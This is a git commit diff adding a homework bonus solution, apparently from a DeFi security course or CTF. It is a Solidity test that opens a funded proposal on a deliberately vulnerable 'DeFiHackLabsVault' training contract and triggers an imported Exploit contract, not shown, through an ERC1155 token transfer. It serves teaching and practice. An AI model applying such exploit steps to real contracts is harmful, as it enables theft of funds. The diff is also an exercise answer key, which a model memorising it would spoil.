da4d76e88541ec6bcc348f18ff1d1d53df0d4197
alex0207s <alexliao-dev@proton.me>
2024-10-12 17:19:26 +0800

    add hw2 bonus challenges solution

--- hw/test/DeFiHackLabsVault/DeFiHackLabsVault.t.sol
+++ hw/test/DeFiHackLabsVault/DeFiHackLabsVault.t.sol
@@ -2,9 +2,22 @@
 pragma solidity =0.8.25;
 
 import {DeFiHackLabsVaultBaseTest} from "test/DeFiHackLabsVault/DeFiHackLabsVaultBase.t.sol";
+import {DeFiHackLabsVault} from "src/DeFiHackLabsVault/DeFiHackLabsVault.sol";
+import {Exploit} from "src/DeFiHackLabsVault/Exploit.sol";
 
 contract DeFiHackLabsVaultTest is DeFiHackLabsVaultBaseTest {
+    Exploit private exploit;
+
     function testDeFiHackLabsVaultExploit() public checkSolved {
         // Do not use any cheat codes here.
+        DeFiHackLabsVault.Proposal memory proposal;
+        proposal.receiver = player;
+        proposal.executed = false;
+        proposal.amount = 7 ether;
+        uint256 id = deFiHackLabsVault.createProposal{value: 1 ether}(proposal);
+
+        exploit = new Exploit(address(deFiHackLabsToken), address(deFiHackLabsVault));
+        deFiHackLabsToken.safeTransferFrom(player, address(exploit), 1, 1, "");
+        exploit.exploit(id);
     }
 }
